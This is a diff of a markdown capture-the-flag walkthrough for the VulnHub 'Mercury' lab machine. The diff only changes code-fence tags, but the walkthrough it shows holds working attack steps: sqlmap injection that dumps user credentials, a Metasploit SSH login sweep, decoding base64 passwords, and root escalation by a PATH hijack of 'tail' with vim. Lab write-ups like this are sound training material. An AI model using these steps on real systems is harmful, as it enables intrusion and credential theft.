@@ -5,7 +5,7 @@ https://www.vulnhub.com/entry/the-planets-mercury,544/
 ### Command used: arp-scan<br>
 <br>
 
-```sh 
+```
 arp-scan --interface=ens33 --localnet
 
 Interface: ens33, type: EN10MB, MAC: 00:0c:29:01:a5:1c, IPv4: 172.16.250.97
@@ -20,7 +20,7 @@ Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
 ### Command used: nmap
 <br>
 
-```sh
+```
 nmap -T4 -sV -p22,8080 merc.vul
 
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-13 17:00 CDT
@@ -86,7 +86,7 @@ Nmap done: 1 IP address (1 host up) scanned in 92.63 seconds
 ### Command used: gobuster
 <br>
 
-```sh
+```
 gobuster dir --url http://merc.vul:8080 --wordlist /usr/share/wordlists/dirb/common.txt
 ===============================================================
 Gobuster v3.1.0
@@ -132,7 +132,7 @@ Adding a special character to the URL to test for SQLi hints that injection is p
 ### Command used: SQLMap
 <br>
 
-```sh
+```
 sqlmap -u http://merc.vul:8080/mercuryfacts/1 --answers="follow=Y" --batch
 
       ___
@@ -216,7 +216,7 @@ back-end DBMS: MySQL >= 5.6
 
 After trying various tables, we determine the "users" table has what we need.<br><br>
 
-```sh
+```
 sqlmap -u http://merc.vul:8080/mercuryfacts/1 -D mercury -T users --dump --answers="follow=Y" --batch
 
         ___
@@ -351,7 +351,7 @@ Enumerating columns from <b>USERS</b> table:
 
 Now that we have credentials, we could manually try each one, or be lazy and use the MSF auxiliary module].
 
-```sh
+```
 msf6 auxiliary(scanner/ssh/ssh_login) > options
 
 Module options (auxiliary/scanner/ssh/ssh_login):
@@ -404,7 +404,7 @@ msf6 auxiliary(scanner/ssh/ssh_login) > run
 
 Logging in with the 'webmaster' credentials, we find the first flag: user_flag.txt
 
-```sh
+```
 webmaster@mercury:~$ ls
 mercury_proj  user_flag.txt
 webmaster@mercury:~$ cat user_flag.txt 
@@ -413,7 +413,7 @@ webmaster@mercury:~$ cat user_flag.txt
 
 Looking in the <i>mercury_proj</i> directory reveals "notes.txt"
 
-```sh
+```
 webmaster@mercury:~$ cd mercury_proj/
 webmaster@mercury:~/mercury_proj$ ls
 db.sqlite3  manage.py  mercury_facts  mercury_index  mercury_proj  notes.txt
@@ -425,7 +425,7 @@ linuxmaster for linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg
 
 Using the echo command, we can convert the base64 strings to clear text:
 
-```sh
+```
 webmaster@mercury:~/mercury_proj$ echo "bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK" | base64 -d
 mercuryisthesizeof0.056Earths
 webmaster@mercury:~/mercury_proj$ echo "bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==" | base64 -d
@@ -434,7 +434,7 @@ mercurymeandiameteris4880km
 
 After switching to the linuxmaster account using the decrypted password, we identify sudo privileges:
 
-```sh
+```
 su linuxmaster
 
 linuxmaster@mercury:/home/webmaster/mercury_proj$ sudo -ll
@@ -458,7 +458,7 @@ linuxmaster@mercury:/home/webmaster/mercury_proj$ ls -l /usr/bin/check_syslog.sh
 
 This indicates that while the script is not writable, the file executes <i>tail</i> as root. To escalate privileges, we can link <i>vim</i> to <i>tail</i> and add the current path to the envrironment variables:
 
-```sh
+```
 linuxmaster@mercury:~$ ln -s /usr/bin/vim tail
 linuxmaster@mercury:~$ ls
 tail
@@ -472,7 +472,7 @@ Instead of the <i>tail</i> command being executed, <i>vim</i> has opened. Within
 : !/bin/bash
 ```
 
-```sh
+```
 root@mercury:/home/linuxmaster# id
 uid=0(root) gid=0(root) groups=0(root)
 root@mercury:/home/linuxmaster#
@@ -480,7 +480,7 @@ root@mercury:/home/linuxmaster#
 
 From here, we can read the final flag: root_flag.txt
 
-```sh
+```
 root@mercury:/home/linuxmaster# cd
 root@mercury:~# ls
 root_flag.txt
